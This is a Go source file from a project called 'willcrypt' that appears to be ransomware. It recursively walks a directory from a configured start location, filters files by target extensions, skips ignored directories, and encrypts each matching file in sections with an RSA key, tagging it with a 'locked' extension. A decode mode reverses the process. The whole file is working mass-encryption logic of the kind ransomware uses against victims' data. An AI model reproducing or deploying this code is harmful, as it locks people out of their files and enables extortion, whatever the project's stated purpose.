package main

import (
	"crypto/rsa"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/sywc670/willcrypt/internal/config"
	"github.com/sywc670/willcrypt/pkg/gowalk"
	"github.com/sywc670/willcrypt/pkg/wcrypt"
)

func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
	var count int32

	filter := func(filePath string, args ...any) {
		defer wg.Done()
		var proceed bool
		isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)

		// ignore check.
		for _, dir := range config.IgnoreDirs {
			if strings.Contains(filepath.Dir(filePath), dir) {
				return
			}
		}

		// Only work on config.Extensions or locked.
		for _, ext := range config.Extensions {
			if strings.HasSuffix(filePath, ext) || isEncrypted {
				proceed = true
				break
			}
		}
		// not in ext , should not proceed.
		if !proceed {
			return
		}

		if !cfg.Decode && isEncrypted {
			debugf("%s already locked, can't encode anymore.\n", filePath)
			return
		}

		if cfg.Decode && !isEncrypted {
			debugf("%s not locked, can't decode anymore.\n", filePath)
			return
		}

		if count < config.ProcessMax {
			atomic.AddInt32(&count, 1)
			fn(filePath, isEncrypted)
		}

	}

	gowalk.Walk(startDir, wg, filter)
}

func goWalkCryption(priv *rsa.PrivateKey, wg *sync.WaitGroup) {
	startDir := cfg.Location
	encryptionOrDecryption := func(filepath string, isEncrypted bool) {
		if isEncrypted {
			debug(filepath, " decrypting...")
			// wcrypt.Decrypt(filepath, priv)
			wcrypt.DecryptBySection(filepath, priv)
		} else if !isEncrypted {
			debug(filepath, " encrypting...")
			// wcrypt.Encrypt(filepath, priv)
			wcrypt.EncryptBySection(filepath, priv)
		}
	}
	debug("Start Walk")
	go walk(startDir, wg, encryptionOrDecryption)
}
